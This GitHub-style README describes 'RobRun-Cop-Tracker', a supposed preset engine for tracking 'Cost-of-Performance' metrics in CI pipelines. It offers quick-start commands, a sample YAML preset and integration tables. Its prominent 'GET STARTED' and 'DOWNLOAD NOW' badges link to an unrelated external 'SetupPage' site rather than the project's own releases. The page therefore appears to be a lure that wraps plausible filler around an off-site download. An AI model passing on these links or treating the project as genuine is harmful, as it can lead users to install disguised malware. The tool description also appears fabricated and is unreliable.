# RobRun‑Cop‑Tracker  
*Configurable preset system for tracking COP metrics in RobRun pipelines*  

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)  
[![Version](https://img.shields.io/badge/Version-1.0.0‑brightgreen.svg)](https://github.com/TigerProxy78/RobRun-Cop-Tracker/releases)  
[![Build Status](https://img.shields.io/github/actions/workflow/status/TigerProxy78/RobRun-Cop-Tracker/ci.yml?branch=main&label=CI)](https://github.com/TigerProxy78/RobRun-Cop-Tracker/actions)  
[![Stars](https://img.shields.io/github/stars/TigerProxy78/RobRun-Cop-Tracker?style=social)](https://github.com/TigerProxy78/RobRun-Cop-Tracker/stargazers)  

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/GET‑STARTED‑orange?style=for-the-badge&logo=github" alt="Get Started"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD‑NOW‑purple?style=for-the-badge&logo=download" alt="Download"></a>
</div>

---  

## 📖 What Is RobRun‑Cop‑Tracker?

RobRun‑Cop‑Tracker is a lightweight, **declarative** engine that lets you define *presets* for observing COP (Cost‑of‑Performance) metrics across any RobRun pipeline.  
Instead of scattering ad‑hoc instrumentation throughout your CI/CD jobs, you author a single YAML (or JSON) preset and let the tracker handle:

* **Metric collection** – latency, throughput, error‑rate, resource consumption, and custom COP counters.  
* **Automatic aggregation** – per‑stage, per‑pipeline, or global view.  
* **Configurable alerts** – thresholds, trend detection, and drift warnings.  
* **Export adapters** – Prometheus, InfluxDB, Datadog, or plain CSV/JSON files.

All of this is driven by a **plug‑and‑play preset system** that can be version‑controlled alongside your pipelines.

---  

## 🚀 Quick‑Start

```bash
# Clone the repo
git clone https://github.com/TigerProxy78/RobRun-Cop-Tracker.git
cd RobRun-Cop-Tracker

# Install the Python helper (requires Python ≥3.9)
pip install -e .

# Create a starter preset
rct init my-preset.yaml
```

Open `my-preset.yaml` and customize the sections you need (see **Preset Anatomy** below).  
When you run your RobRun pipeline, inject the tracker:

```bash
robrun run --preset my-preset.yaml
```

That’s it – the tracker will start emitting COP metrics to the destination you configured.

---  

## 📂 Preset Anatomy

A preset is a single file that describes **what**, **how**, and **where** to capture metrics.

```yaml
# my-preset.yaml
metadata:
  name: "core‑pipeline‑metrics"
  description: "Baseline COP metrics for the main CI pipeline"
  version: "1.0.0"

collect:
  - name: latency
    scope: stage
    selector: "**/run*"
  - name: cpu_usage
    scope: job
    interval: 5s

alert:
  latency:
    threshold: "200ms"
    policy: "notify"
  error_rate:
    threshold: "0.02"
    policy: "fail"

export:
  prometheus:
    endpoint: "http://prometheus.local:9090/api/v1/write"
  csv:
    path: "./metrics/run‑metrics.csv"
```

| Section   | Purpose |
|-----------|---------|
| `metadata`| Human‑readable identification and versioning. |
| `collect` | Metric definitions – built‑in types or custom scripts. |
| `alert`   | Threshold‑based actions (notify, pause, fail). |
| `export`  | Destination adapters – one or many may be defined. |

---  

## 🛠️ Advanced Features  

| Feature | Description |
|---------|-------------|
| **Dynamic Variables** | Use `${ENV_VAR}` placeholders to inject runtime values (e.g., branch name). |
| **Conditional Blocks** | `if: ${{ github.event_name == 'push' }}` enables context‑aware collection. |
| **Extensible Plugins** | Drop a Python module into `plugins/` and reference it in `collect` via `type: custom`. |
| **Versioned Roll‑backs** | Preserve historic presets in a `presets/` folder; the tracker can auto‑select the latest compatible version. |
| **Dashboard Generation** | Run `rct dashboard` to spin up a lightweight UI that visualizes the latest run’s metrics. |

---  

## 📊 Example Dashboard

The built‑in UI renders a responsive grid of graphs:

![Dashboard screenshot](https://raw.githubusercontent.com/TigerProxy78/RobRun-Cop-Tracker/main/docs/assets/dashboard.png)

*Hover over a point to see the exact COP value, or click a graph to drill down into per‑stage breakdowns.*

---  

## 🧩 Integration Checklist  

| utility | Integration Method |
|------|--------------------|
| **GitHub Actions** | Add a step `uses: TigerProxy78/RobRun-Cop-Tracker@v1` and reference your preset file. |
| **GitLab CI** | Export `RCT_PRESET` env var and call `rct run` in a job script. |
| **Jenkins** | Use the **Pipeline** snippet `rct exec my-preset.yaml`. |
| **Azure DevOps** | Place the preset in the repo and add a `script: rct run --preset $(Build.SourcesDirectory)/my-preset.yaml`. |

---  

## 🤝 Contributing  

We welcome community contributions!  

1. **Fork** the repository.  
2. Create a feature branch (`git checkout -b feat/awesome‑preset`).  
3. Add or modify presets, plugins, or documentation.  
4. Run the test suite: `pytest -q`.  
5. Submit a Pull Request with a clear description and example usage.  

Please read our [CODE_OF_CONDUCT](CODE_OF_CONDUCT.md) and [CONTRIBUTING](CONTRIBUTING.md) files before you start.

---  

## 📜 License  

RobRun‑Cop‑Tracker is released under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---  

## 📞 Get in Touch  

* **Issues & Feature Requests** – open a ticket in the GitHub Issues tab.  
* **Discussions** – join the community chat on **GitHub Discussions** for design talks and roadmap planning.  
* **Twitter** – follow [@TigerProxy78](https://twitter.com/TigerProxy78) for announcements.  

Happy tracking!